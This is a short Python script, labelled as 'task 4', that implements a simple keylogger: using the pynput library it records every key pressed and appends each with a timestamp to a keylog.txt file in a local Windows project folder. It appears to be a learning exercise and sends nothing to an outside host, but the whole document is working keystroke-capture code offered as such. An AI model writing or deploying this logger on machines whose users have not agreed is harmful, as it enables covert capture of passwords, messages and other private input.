#task 4 simple Keylogger

import pynput
from pynput.keyboard import Key,Listener
import logging

log_location = r"C:\Users\fagam\PycharmProjects\Keylogger"
logging.basicConfig(filename=(log_location + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def take_input(key):
    logging.info(str(key))

with Listener(on_press=take_input)  as listener:
    listener.join()